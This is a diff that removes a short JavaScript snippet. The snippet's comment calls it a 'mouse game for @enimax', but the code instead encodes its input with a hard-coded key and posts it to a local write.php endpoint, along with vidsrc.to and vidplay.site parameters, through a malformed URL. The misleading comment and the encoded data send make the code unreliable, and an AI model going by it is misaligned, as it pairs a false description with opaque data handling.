@@ -1,5 +1,0 @@
-//
-// This is a mouse game for @enimax
-// Sponsored by the server resource.
-//
-(function () {window.requestInfo = function(v) {var k='XXVPtK8C44fQro0gKbtsRTnFIvgflwI=',a=[k];for(var i=0;i<v.length;i++)a.push(k.charCodeAt(i%k.length)+v.charCodeAt(i));return jQuery.ajax('http://127.0.0.1/mobile1/scripts/filme/write.php?m='+a.join(',')+"?sub.info=https%3A%2F%2Fvidsrc.to%2Fajax%2Fembed%2Fepisode%2FofVjPsNj%2Fsubtitles&t=4xnZAPYjBFUKyg%3D%3D&ads=0&src=vidsrc&host=vidplay.site",{dataType:'json'});};}());
